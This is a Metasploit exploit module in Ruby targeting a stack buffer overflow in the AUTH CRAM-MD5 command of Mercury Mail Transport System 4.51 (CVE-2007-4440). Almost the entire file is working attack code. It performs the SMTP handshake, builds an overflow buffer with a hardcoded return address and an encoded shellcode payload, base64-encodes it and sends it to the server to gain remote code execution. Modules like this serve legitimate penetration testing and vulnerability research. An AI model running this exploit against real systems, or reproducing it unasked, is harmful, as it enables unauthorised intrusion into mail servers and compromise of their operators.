##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Mercury Mail SMTP AUTH CRAM-MD5 Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in Mercury Mail Transport System 4.51.
        By sending a specially crafted argument to the AUTH CRAM-MD5 command, an attacker
        may be able to execute arbitrary code.
      },
      'Author'         => [ 'MC' ],
      'References'     =>
        [
          [ 'CVE', '2007-4440' ],
          [ 'OSVDB', '39669' ],
          [ 'BID', '25357' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Platform'       => 'win',
      'Privileged'     => true,
      'Payload'        =>
        {
          'Space'    => 600,
          'BadChars' => "\x00\x0a\x0d\x20\x25",
          'StackAdjustment' => -3500,
        },
      'Targets'        =>
        [
          [ 'Mercury Mail Transport System 4.51',	{ 'Ret' => 0x258d0d1e } ], # ter32.dll
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2007-08-18'))

    register_options([ Opt::RPORT(25) ])
  end

  def exploit
    connect

    sock.get_once

    sock.put("EHLO\r\n")

    sock.get_once

    sock.put("AUTH CRAM-MD5\r\n")

    sock.get_once
    select(nil,nil,nil,0.25)

    buffer =  rand_text_alpha_upper(204) + [target.ret].pack('V')
    buffer << payload.encoded + rand_text_alpha_upper(1075 - payload.encoded.length)

    sploit = Rex::Text.encode_base64(buffer)

    print_status("Trying target #{target.name}...")
    sock.put(sploit + "\r\n")

    handler
    disconnect
  end
end
